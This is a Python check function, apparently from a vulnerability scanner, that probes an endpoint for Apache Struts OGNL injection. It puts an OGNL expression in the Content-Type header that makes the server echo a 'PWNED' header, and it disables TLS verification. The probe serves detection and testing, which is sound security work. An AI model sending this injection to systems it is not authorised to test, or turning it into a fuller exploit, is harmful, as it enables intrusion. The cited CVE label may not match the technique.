from linker import *

@helpers.on_error("Unreachable")
def chkstruts(endpoint,timeout=30):
    url = helpers.urlify(endpoint)['URL_FILE']
    ognl_payload = ".multipart/form-data~${"
    ognl_payload += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
    ognl_payload += "}"
    headers = {'Content-Type': ognl_payload}

    response = requests.get(url,headers=headers,timeout=timeout,verify=False)
    
    if "PWNED" in response.headers:
        return "%sVulnerable [https://github.com/mazen160/struts-pwn_CVE-2018-11776]" % (Fore.GREEN)
    else:
        return "%sSafe" % (Fore.RED)

